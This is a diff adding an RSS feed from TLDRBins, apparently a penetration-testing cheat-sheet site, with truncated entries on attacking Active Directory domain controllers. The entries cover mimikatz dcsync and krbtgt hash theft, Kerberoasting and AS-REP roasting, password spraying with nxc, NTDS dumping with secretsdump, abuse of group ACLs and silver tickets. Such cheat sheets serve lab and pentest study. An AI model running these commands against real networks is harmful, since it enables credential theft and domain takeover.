@@ -1,0 +1,74 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Domain Controller on TLDRBins</title>
+    <link>https://tldrbins.github.io/@domain-controller/</link>
+    <description>Recent content in Domain Controller on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@domain-controller/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Abuse Parent Child Domain Trusts</title>
+      <link>https://tldrbins.github.io/abuse_parent_child_domain_trusts/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/abuse_parent_child_domain_trusts/</guid>
+      <description>Privesc from DA (Domain Admin) to EA (Enterprise Admin) 1. Check trust relationships # Get all trusted domain objects in a forest Get-ADTrust -Filter * # Returns a list of trusted domains nltest /domain_trusts # Gets a collection of the trust relationships of the current forest ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships() 2. Get current and target domain SID ./mimikatz.exe &amp;#39;lsadump::trust&amp;#39; &amp;#39;exit&amp;#39; 3. Get krbtgt hash of current domain ./mimikatz.exe &amp;#39;lsadump::dcsync /all /csv&amp;#39; &amp;#39;exit&amp;#39; 4.</description>
+    </item>
+    <item>
+      <title>AddSelf</title>
+      <link>https://tldrbins.github.io/addself/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/addself/</guid>
+      <description>Privesc #1: Add self to group (From Linux) powerview.py powerview.py&#xA;# Connect sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; powerview &amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET_DOMAIN&amp;gt; # Add self to group Add-DomainGroupMember -Identity &amp;lt;TARGET_GROUP&amp;gt; -Members &amp;lt;USERNAME&amp;gt; # Check Get-DomainGroupMember -Identity &amp;lt;TARGET_GROUP&amp;gt; # Exit and login again to apply changes Add-DomainObjectAcl -TargetIdentity &amp;lt;ANOTHER_GROUP&amp;gt; -PrincipalIdentity &amp;lt;USERNAME&amp;gt; -Rights fullcontrol # Check Get-DomainObjectAcl -Identity &amp;lt;TARGET_USER_IN_ANOTHER_GROUP&amp;gt; -Where &amp;#34;SecurityIdentifier contains &amp;lt;USERNAME&amp;gt;&amp;#34; bloodAD bloodyAD&#xA;python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USERNAME&amp;gt; -p &amp;lt;PASSWORD&amp;gt; --host &amp;lt;DC&amp;gt; add groupMember &amp;lt;TARGET_GROUP&amp;gt; &amp;lt;USERNAME&amp;gt; # After getting full control of target group (e.</description>
+    </item>
+    <item>
+      <title>Kerberoasting</title>
+      <link>https://tldrbins.github.io/roasting/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/roasting/</guid>
+      <description>AS_REP Roasting # Multiple valid usernames impacket-GetNPUsers &amp;lt;DOMAIN&amp;gt;/ -usersfile usernames.txt -no-pass -dc-ip &amp;lt;DC&amp;gt; # Multiple valid usernames (nxc) nxc ldap 10.10.11.10 -u usernames.txt -p &amp;#39;&amp;#39; --asreproast as_rep_hashes.txt # Single user without creds impacket-GetNPUsers -no-pass -dc-ip 10.10.11.10 &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt; Kerberoasting From Linux # Fix time skew sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-GetUserSPNs -request &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC_IP&amp;gt; Note: Times skew have to be within 5 minutes in kerberos&#xA;# Kerberoasting without cred sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-GetUserSPNs -no-preauth &amp;lt;USER_WITH_DONT_REQUIRE_PREAUTH&amp;gt; -usersfile usernames.</description>
+    </item>
+    <item>
+      <title>Kerberos</title>
+      <link>https://tldrbins.github.io/kerberos/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/kerberos/</guid>
+      <description>Kerbrute kerbrute&#xA;kerbrute userenum --domain &amp;lt;DOMAIN&amp;gt; --dc &amp;lt;DC&amp;gt; usernames.txt Usernames generator username-anarchy&#xA;./username-anarchy -i users.txt | tee usernames.txt Generate Kerberos Ticket (From Linux) Method #1: Using impacket sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-getTGT -hashes :&amp;lt;HASH&amp;gt; &amp;lt;DOMAIN&amp;gt;/administrator export KRB5CCNAME=administrator.ccache # Check ticket klist Method #2 : Using kinit # Step 0: Installation sudo apt install krb5-user cifs-utils # Step 1: Add domain controller to &amp;#39;/etc/hosts&amp;#39; (Try different order if not work) 10.</description>
+    </item>
+    <item>
+      <title>Machine Account</title>
+      <link>https://tldrbins.github.io/machine_account/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/machine_account/</guid>
+      <description> Abuse #1: Microsoft virtual account 1. Create a ticket from Microsoft virtual account .\rubeus.exe tgtdeleg /nowrap 2. Convert kirbi to ccache (Back to Linux) RubeusToCcache&#xA;python3 rubeustoccache.py &amp;lt;BASE64_TICKET&amp;gt; secrets.kirbi secrets.ccache 3. Secrets Dump export KRB5CCNAME=secrets.ccache sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-secretsdump -k -no-pass -just-dc-user administrator </description>
+    </item>
+    <item>
+      <title>NetExec (nxc)</title>
+      <link>https://tldrbins.github.io/nxc/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/nxc/</guid>
+      <description>nxc Download nxc&#xA;Basic Commands # Single user and password nxc smb 10.10.11.10 -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; # Single user and password (Active Directory) nxc smb -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -d &amp;lt;DOMAIN&amp;gt; -dc-ip &amp;lt;DC_IP&amp;gt; # Multiple users or passwords nxc smb -u usernames.txt -p &amp;lt;PASSWORD&amp;gt; -d &amp;lt;DOMAIN&amp;gt; -dc-ip &amp;lt;DC_IP&amp;gt; --continue-on-success # Match username to corresponding password nxc smb 10.10.11.10 -u usernames.txt -p passwords.txt --no-bruteforce --continue-on-success # With LM Hash:NT Hash nxc smb 10.</description>
+    </item>
+    <item>
+      <title>RPC</title>
+      <link>https://tldrbins.github.io/rpc/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/rpc/</guid>
+      <description> rpcclient # Connect without creds rpcclient -U &amp;#39;&amp;#39; -N 10.10.11.10 # Connect with creds rpcclient -U &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt; 10.10.11.10 # Inline execute command rpcclient -U &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt; 10.10.11.10 -c &amp;#39;querydispinfo&amp;#39; Basic Commands # General info querydispinfo # List of users enumdomusers # List of groups enumdomgroups # Query group by rid querygroup &amp;lt;RID&amp;gt; # Query group member by rid querygroupmem &amp;lt;RID&amp;gt; # Query user by rid queryuser &amp;lt;RID&amp;gt; # Look up a user lookupnames &amp;lt;USER&amp;gt; # Look up by SID lookupsids &amp;lt;SID&amp;gt; impacket-lookupsid impacket-lookupsid &amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt; </description>
+    </item>
+    <item>
+      <title>secretsdump</title>
+      <link>https://tldrbins.github.io/secretsdump/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/secretsdump/</guid>
+      <description> With ntds.dit and SYSTEM hive impacket-secretsdump -ntds ntds.dit -system system LOCAL With SAM, SYSTEM and SECURITY Hives impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL With dcsync right impacket-secretsdump impacket-secretsdump &amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt; nxc nxc smb -dc-ip &amp;lt;DC&amp;gt; -u &amp;lt;USER&amp;gt; -H &amp;lt;HASH&amp;gt; --ntds </description>
+    </item>
+    <item>
+      <title>Silver Ticket</title>
+      <link>https://tldrbins.github.io/silver_ticket/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/silver_ticket/</guid>
+      <description>From Windows 1. Get service principle name (SPN) .\rubeus.exe kerberoast /domain:&amp;lt;DOMAIN&amp;gt; /dc:&amp;lt;DC&amp;gt; /creduser:&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt; /credpassword:&amp;lt;PASSWORD&amp;gt; /nowrap 2. Generate NTLM .\rubeus.exe hash /password:&amp;lt;PASSWORD&amp;gt; 3. Get domain SID 3a. Locally import-module activedirectory Get-ADDomain | fl DomainSID 3b. Remotely # Install ldp.exe (Windows 11) Settings &amp;gt; System &amp;gt; Optional Features &amp;gt; More Windows Features and add &amp;#39;Active Driectory Lightweight Directory Services&amp;#39; # Bind &amp;gt; Bind with credentials ldp.exe # Browse &amp;gt; Search BaseDN: DC=&amp;lt;example&amp;gt;,DC=&amp;lt;com&amp;gt; Filter: (objectclass=User) 4.</description>
+    </item>
+  </channel>
+</rss>
